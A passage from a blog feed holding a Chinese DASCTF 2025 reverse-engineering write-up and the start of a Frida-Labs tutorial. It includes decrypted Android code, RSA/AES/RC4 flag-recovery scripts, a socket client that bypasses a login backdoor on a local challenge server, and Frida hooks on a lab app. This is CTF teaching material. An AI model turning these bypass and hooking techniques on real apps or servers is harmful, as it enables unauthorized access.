class="string">&quot;QMXCGE8qPL1G7O8mYw0GuUzS8C1JKiSzXvT0GFg6L7VMyYYubTo33EXs/gEzEjSWS9eNF2EoKZxH\n5Z4aQw49wmnQ/UBsCCmkTO/EJmAtALZJy81YZBA3tmvvgDo5CCaSPcKaXVgiXIRJ9scoRDcto1Tg\n2CdKDiC0TPTwLkoqWMo=\n&quot;</span>, <span class="string">&quot;DYO1bwt7Zfc=\n&quot;</span>), <span class="number">0</span>)));</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(w.i(<span class="string">&quot;sSby\n&quot;</span>, <span class="string">&quot;43WztTWiQRk=\n&quot;</span>));</span><br><span class="line">        cipher.init(<span class="number">1</span>, generatePublic);</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeToString(cipher.doFinal(bytes), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: private */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">a_p</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v10, types: [B.h] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v24 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v25 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v26 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v27 */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v28 */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// f.AbstractActivityC0139h, androidx.activity.n, y.f, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        ?? r10;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> p.f753a;</span><br><span class="line">        <span class="type">J</span> <span class="variable">j2</span> <span class="operator">=</span> J.f705a;</span><br><span class="line">        <span class="type">K</span> <span class="variable">k2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">K</span>(<span class="number">0</span>, <span class="number">0</span>, j2);</span><br><span class="line">        <span class="type">K</span> <span class="variable">k3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">K</span>(p.f753a, p.f754b, j2);</span><br><span class="line">        <span class="type">View</span> <span class="variable">decorView</span> <span class="operator">=</span> getWindow().getDecorView();</span><br><span class="line">        c.d(decorView, <span class="string">&quot;window.decorView&quot;</span>);</span><br><span class="line">        <span class="type">Resources</span> <span class="variable">resources</span> <span class="operator">=</span> decorView.getResources();</span><br><span class="line">        c.d(resources, <span class="string">&quot;view.resources&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">booleanValue</span> <span class="operator">=</span> ((Boolean) j2.b(resources)).booleanValue();</span><br><span class="line">        <span class="type">Resources</span> <span class="variable">resources2</span> <span class="operator">=</span> decorView.getResources();</span><br><span class="line">        c.d(resources2, <span class="string">&quot;view.resources&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">booleanValue2</span> <span class="operator">=</span> ((Boolean) j2.b(resources2)).booleanValue();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> Build.VERSION.SDK_INT;</span><br><span class="line">        <span class="keyword">if</span> (i3 &gt;= <span class="number">30</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">29</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">28</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Window</span> <span class="variable">window</span> <span class="operator">=</span> getWindow();</span><br><span class="line">        c.d(window, <span class="string">&quot;window&quot;</span>);</span><br><span class="line">        r10.C0(k2, k3, window, decorView, booleanValue, booleanValue2);</span><br><span class="line">        <span class="type">Window</span> <span class="variable">window2</span> <span class="operator">=</span> getWindow();</span><br><span class="line">        c.d(window2, <span class="string">&quot;window&quot;</span>);</span><br><span class="line">        r10.d(window2);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.f1685y = (Button) findViewById(R.id.mybutton1);</span><br><span class="line">        <span class="built_in">this</span>.f1686z = (TextView) findViewById(R.id.edit_text_1);</span><br><span class="line">        <span class="built_in">this</span>.f1684A = (TextView) findViewById(R.id.edit_text_2);</span><br><span class="line">        <span class="type">String</span> <span class="variable">i4</span> <span class="operator">=</span> w.i(<span class="string">&quot;ZKIxD0oa9odiixwxZj3Mg2i1AzpMGu6JepMHD10K5Y9ornU5aAr95mGLDRY2Iv6sb7B+AGQY46Zj\ngm0NRj73+E23DldpOOOeaIg3MWUdyoxtrD5PYSD9jE+Icy08OOyoGaVpSl0Slr5tkTQ/QQfnmXCH\nKzBPPuqOaJMDOU8akvA=\n&quot;</span>, <span class="string">&quot;KeRGeA5Lr80=\n&quot;</span>);</span><br><span class="line">        w.i(<span class="string">&quot;r2hpyBZCQnOjZWHEAnRgQIpKSc15ZDtzo3BlzAFSWHKjdRj9J3ROBqNGZcsBeE5wjEJisgJbP1SF\nUEbzClFkZ7JbZ8QJZlpdzRcU73V1ZwCrRwvJN2dCcrVOSdgWJ0p8hGlV4xJWSRq6TXTrN1k8YKYO\nesAqIXx+1FJ5vjN3RVmbeEPJdEJCdaNwYcgBeE5wihkRzSR0IFqBZ2jlBCpKQoBKctJvcn9Et1VD\n/Rh4Un3WRmu4DF5fWZJFZcwIWkQGsUJSoRNKbUaTTE2lDF5/WoBOSs8HVmV/jWhG5y9ffXaESXjr\nAUJCWaNvZN0vK0Rir3JxzC5lYwDQGEPMKUVtaKlNc74lcDkFi1lWzAQrbWSmFXPYAXpOcJV2Yv8a\nIGBemhBOuHFSeGWjWU/na1Y4S9dqdd8PQF5bsnlWzXZnUXOFd2XJCVdEYdBYEP4Tej0ek2hM5nZR\neneaTFjNeXZYX6EVcMcmclpaj05O0gJcQ2OjSGLnCkZbQrdmTeB4PG5pmkpOyTAkfWKheFOzE0k4\neaVCZOYwIz57j0REsglCQlmja07PcUNFVNtNY78PcnFWsHhI2QclaXahdULsBltfB61UV8kWWnNj\nsVkU2g==\n&quot;</span>, <span class="string">&quot;4iEgikATCzE=\n&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.f1685y.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View$OnClickListenerC0168a</span>(<span class="built_in">this</span>, A(), i4, A()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enkey_QMz2qirA80LJiOs30Efl00JsrIv+ZdrM9iB74P/nCWOrzEemEOaq2lN1/V5/rOAoTgBanJO/AcpookhVIOVdsA==</span><br><span class="line">eniv_hKH/M/v8zwVICeWlc652BZk2eA/c2g0cLpBwvWBVlphiwBBasdn9HPWk7sb/IaRh8eppZrToUwz6f1eomFJkEQ=</span><br></pre></td></tr></table></figure><p>直接看so层</p><p>Java_com_dasctf_androidfile_MainActivity_a_1p</p><p>有个明显的RC4，最后还有个base64，很清晰的逻辑</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062006539.png" alt="ffffffffffffffffff21321321"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;截获包含flag的数据包.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">first, rest = txt.split(<span class="string">&quot;&lt;-encryptinput-&gt;&quot;</span>, <span class="number">1</span>)</span><br><span class="line">aes_b64 = rest.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">rc4_plain = ARC4.new(<span class="string">b&quot;REVERSE&quot;</span>).decrypt(base64.b64decode(first)).decode()</span><br><span class="line">key_b64, iv_b64 = rc4_plain[<span class="built_in">len</span>(<span class="string">&quot;enkey_&quot;</span>):].split(<span class="string">&quot;eniv_&quot;</span>)</span><br><span class="line">key_b64 = <span class="string">&quot;&quot;</span>.join(key_b64.split())</span><br><span class="line">iv_b64  = <span class="string">&quot;&quot;</span>.join(iv_b64.split())</span><br><span class="line"></span><br><span class="line">pem_priv = re.search(<span class="string">r&quot;-----BEGIN PRIVATE KEY-----\\s*(.+?)\\s*-----END PRIVATE KEY-----&quot;</span>, txt, re.S).group(<span class="number">1</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">priv = RSA.import_key(<span class="string">&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span>+pem_priv+<span class="string">&quot;\n-----END PRIVATE KEY-----&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_raw</span>(<span class="params">b64_ct</span>):</span><br><span class="line">  ct = <span class="built_in">int</span>.from_bytes(base64.b64decode(b64_ct), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">  pt = <span class="built_in">pow</span>(ct, priv.d, priv.n).to_bytes((priv.size_in_bits()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">  <span class="keyword">while</span> pt <span class="keyword">and</span> pt[<span class="number">0</span>]==<span class="number">0</span>: pt = pt[<span class="number">1</span>:]</span><br><span class="line">  <span class="keyword">return</span> pt</span><br><span class="line">aes_key = rsa_raw(key_b64)</span><br><span class="line">aes_iv  = rsa_raw(iv_b64)</span><br><span class="line"></span><br><span class="line">cipher_bytes = base64.b64decode(aes_b64)</span><br><span class="line">flag = unpad(AES.new(aes_key, AES.MODE_CBC, aes_iv).decrypt(cipher_bytes), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>DASCTF{android_encrypto_file_and_plains}</p><h2 id="androidfff"><a href="#androidfff" class="headerlink" title="androidfff"></a>androidfff</h2><p>flutter逆向</p><p>先用blutter导出name然后导入IDA分析，blutter产生以下文件</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062004516.png" alt="image-20251206200421439"></p><p>把ida_script导入ida即可</p><p>然后看asm的main.dart,可以发现_checkFlag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062004921.png" alt="image-20251206200432694"></p><p>_checkFlag（起始 0x29c7b0）的逻辑块在文件中 _checkFlag(&#x2F;* No info *&#x2F;)段。这里能看到</p><p>LoadField 取 TextEditingController 的文本</p><p>调 _xorEncrypt（bl #0x29cb18）</p><p>取构造函数里写死的列表 field_1b；</p><p>调 ListEquality.equals</p><p>_xorEncrypt 本体在同一文件的 “_xorEncrypt(&#x2F;* No info *&#x2F;)” 段</p><p>入口创建 CodeUnits 对象，保存输入字符串；</p><p>取闭包地址 [pp+0xc038]（注释 “AnonymousClosure … _xorEncrypt (0x29cb18)”）创建闭包；</p><p>闭包体就在 _xorEncrypt 段后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cipher = [236,230,194,226,204,232,146,168,188,142,140,140,174,128,218,182,130,218,130,186,218,174,166,130,150,158]</span><br><span class="line">flag = &#x27;&#x27;.join(chr((v &gt;&gt; 1) ^ 0x32) for v in cipher)</span><br><span class="line">print(flag)  # DASCTF&#123;flutter_is_so_easy&#125;</span><br></pre></td></tr></table></figure><p>DASCTF{flutter_is_so_easy}</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>server里有个RSA</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062045281.png" alt="image-20251206204512130"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">b&quot;qwertyui&quot;</span>  <span class="comment"># RC4 key</span></span><br><span class="line"></span><br><span class="line">magic1 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1638e0eb936140b5527033292cbefcd73b55cfc7fb79df51ae3768a0dd9c84ae4580e47a5133b425f4c93eac97e4b1aa0b4cd30589d004f6d0d19fcbc709e86cc2996b433d29f650b69987a466f05bef7f69945860dcc44742a511f3621385c89fbd4d73153615789634b25cfc3151a4115bc30c96979e5f965290f36a863e3378b</span></span><br><span class="line"><span class="string">5cfc9ba31438c4bae22b23ef815edf7cf1771803bd392a5072b468900b75f5a4377d1daf3d6f7b7b6850d1a4a4134f2f65840efaa9b83d31083051df0fc80a786529159484f62bbb9524f68285f48c7ab8e03bdfeca1a6025aaed9f9728b390689c0c963920c728eb5695fcb9413f9f4e06d3b93db40e26d6275c84e6126a&quot;</span>)</span><br><span class="line">magic2 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;373a2a27b38fd778c716728ebb95be89a0a057109119a08d5ce49261ebb0e0776d254a40c4d21bd2463e61608771de401eed13ac6660d996bea8c8b82bdd0eaf56c38466776eba31f7b2219230b654a77ec0af395a01c31c139a4f6b7b8ba845192096165dd7acd0331e79dbe434ed8c9a66581d26f69e5faa295f66010076b91a6</span></span><br><span class="line"><span class="string">dd61db7abd325f8bd25d928debcc02e5555ff81f7ae3e548e3e4659a37f5d3d3c39fbcad1b583e42fb04fa328ebb77e7841f45b711e77ee23e11989db2c0e06b8191a456d56bd1a7d42c47fdfdf1179228b57c6efca9b9b6a7d22682e5b67c7c46a877fb677f5f317b4823fcdc812f0362be27c0f5453037148ed30127b26&quot;</span>)</span><br><span class="line">magic3 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;add1d11960c22d9166dac3c26725c81909176b238e3003aa57aacba0a226b7c31c220b8d209cb495b55db4e27d4e438e088000000000000009820000000000001082000000000000188300000000000020840000000000000000000000000000637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7f</span></span><br><span class="line"><span class="string">d9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key: <span class="built_in">bytes</span>, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">  S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)); j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">      j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">      S[i], S[j] = S[j], S[i]</span><br><span class="line">  i = j = <span class="number">0</span>; out = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">      i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">      j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">      S[i], S[j] = S[j], S[i]</span><br><span class="line">      out.append(b ^ S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>])</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_stage</span>(<span class="params">sock, payload: <span class="built_in">bytes</span></span>):</span><br><span class="line">  sock.sendall(rc4(KEY, payload))</span><br><span class="line">  resp = rc4(KEY, sock.recv(<span class="number">4096</span>))</span><br><span class="line">  <span class="built_in">print</span>(resp)</span><br><span class="line">  <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">with</span> socket.create_connection((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)) <span class="keyword">as</span> s:</span><br><span class="line">      send_stage(s, <span class="string">b&quot;req login...&quot;</span>)</span><br><span class="line">      send_stage(s, magic1)</span><br><span class="line">      send_stage(s, magic2)</span><br><span class="line">      send_stage(s, magic3)</span><br><span class="line">      <span class="comment"># 继续读 flag</span></span><br><span class="line">      <span class="built_in">print</span>(rc4(KEY, s.recv(<span class="number">4096</span>)))</span><br></pre></td></tr></table></figure><ul><li>account: aassddffgghhjjll</li><li>key: qqwweerrttyyuuii</li></ul><p>Server：handle_client(0x29C0) 调用 rsa_priv_decrypt(0x73B2) </p><p>sub_73B2 用 .rodata 里的十六进制字符串 rsa_{n,e,p,q,d}_hex 生成 RSA 私钥，并用 RSA_private_decrypt(…, padding&#x3D;OAEP) 解密收到的密文。但解出的结果仅存入局部变量，未参与任何校验，后面仅比较收到的 RC4 明文是否等于 magic_stage1&#x2F;2&#x2F;3，构成后门。</p><p>Client：sub_5042 用同样的 rsa_{n,e,p,q}_hex 构建 RSA 公钥，RSA_public_encrypt(…, padding&#x3D;OAEP) 加密 account、key，配合 AES-CBC 加密 passwd 发送。解出的明文实际上是</p><p>这里调了4125为AES加密，account是IV</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062043326.png" alt="image-20251206204343239"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv  = <span class="string">b&#x27;aassddffgghhjjll&#x27;</span>          <span class="comment"># RSA 解出 account（IV）</span></span><br><span class="line">key = <span class="string">b&#x27;qqwweerrttyyuuii&#x27;</span>          <span class="comment"># RSA 解出 key</span></span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line"><span class="string">&quot;add1d11960c22d9166dac3c26725c81909176b238e3003aa57aacba0a226b7c&quot;</span></span><br><span class="line"><span class="string">&quot;31c220b8d209cb495b55db4e27d4e438e0880000000000000098200000000000&quot;</span></span><br><span class="line"><span class="string">&quot;0108200000000000018830000000000002084000000000000000000000000000&quot;</span></span><br><span class="line"><span class="string">&quot;00637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca47&quot;</span></span><br><span class="line"><span class="string">&quot;2c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27&quot;</span></span><br><span class="line"><span class="string">&quot;b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4&quot;</span></span><br><span class="line"><span class="string">&quot;c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110&quot;</span></span><br><span class="line"><span class="string">&quot;fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814d&quot;</span></span><br><span class="line"><span class="string">&quot;e5e0bdb&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)</span><br><span class="line">flag = pt.split(<span class="string">b&#x27;\x06&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># 去掉 PKCS#7 padding</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>DASCTF{dqmaxfwkm921kr21m;df1m1dqmlk1d12d1}</p><ul><li><p>RSA逻辑：sub_5042(0x5042) 里用 .rodata 的 n&#x2F;e&#x2F;p&#x2F;q&#x2F;d 做 BN_hex2bn→RSA_new→RSA_set0_key&#x2F;factors，然后 RSA_public_encrypt(…, RSA_PKCS1_OAEP_PADDING)；main 先 sub_5302 读 config 再用它加密 account&#x2F; key 两段发送。account 明文即后续 AES 的 IV，key 明文即 AES key。</p><ul><li>AES逻辑：sub_49DD 调 sub_4125（AES-128-CBC），用 key&#x3D;上一步明文，IV&#x3D;account 明文，对 passwd 做加密。RC4 发送的第三段（服务端 magic_stage3）就是这个 AES 密文。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DASCTF-2025下半年赛-RE-wp&quot;&gt;&lt;a href=&quot;#DASCTF-2025下半年赛-RE-wp&quot; class=&quot;headerlink&quot; title=&quot;DASCTF 2025下半年赛 RE wp&quot;&gt;&lt;/a&gt;DASCTF 2025下半年赛 RE wp&lt;/</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Frida 学习(Frida-Labs)</title>
    <link href="http://matriy330.github.io/fc586b74/"/>
    <id>http://matriy330.github.io/fc586b74/</id>
    <published>2025-12-03T14:17:37.000Z</published>
    <updated>2025-12-03T14:17:52.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-学习-Frida-Labs"><a href="#Frida-学习-Frida-Labs" class="headerlink" title="Frida 学习(Frida-Labs)"></a>Frida 学习(Frida-Labs)</h1><p>不能当Ai高手，还得学学</p><p>练习项目地址：<a href="https://github.com/DERE-ad2001/Frida-Labs/tree/main">DERE-ad2001&#x2F;Frida-Labs: The repo contains a series of challenges for learning Frida for Android Exploitation.</a></p><h2 id="Frida-0x1"><a href="#Frida-0x1" class="headerlink" title="Frida 0x1"></a>Frida 0x1</h2><p>i是random出来的，我们要向输出可以重新调用check</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031316875.png" alt="image-20251203131629772"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>[<span class="string">&quot;check&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -F -l .\frida0x1.js</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x2 -l frida1.js</span><br></pre></td></tr></table></figure><h2 id="Frida-0x2"><a href="#Frida-0x2" class="headerlink" title="Frida 0x2"></a>Frida 0x2</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031339994.png" alt="image-20251203133944934"></p><p>未被调用，需要主动调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x3"><a href="#Frida-0x3" class="headerlink" title="Frida 0x3"></a>Frida 0x3</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031341510.png" alt="image-20251203134118423"></p><p>需要hook checker.code</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span 